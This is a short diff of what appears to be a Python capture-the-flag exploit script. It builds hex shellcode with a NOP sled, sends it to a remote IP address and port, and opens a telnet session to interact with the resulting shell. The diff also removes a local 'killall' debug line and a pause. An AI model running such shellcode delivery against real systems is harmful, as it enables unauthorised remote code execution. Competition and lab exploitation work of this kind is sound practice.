@@ -32,13 +32,11 @@ def build(name):
 #ADDR = ('localhost', 1234)
 ADDR = ('136.243.194.42', 1024)
 if __name__ == '__main__':
-    os.system("killall -9 sandbox.bin")
     sc = (build("shellcode") + "90" * 8).decode("hex")
 
     s = create_connection(ADDR)
     f = s.makefile(bufsize = 0)
     print (f.readline()),
-    raw_input()
     f.write(sc)
 
     tn = telnetlib.Telnet()
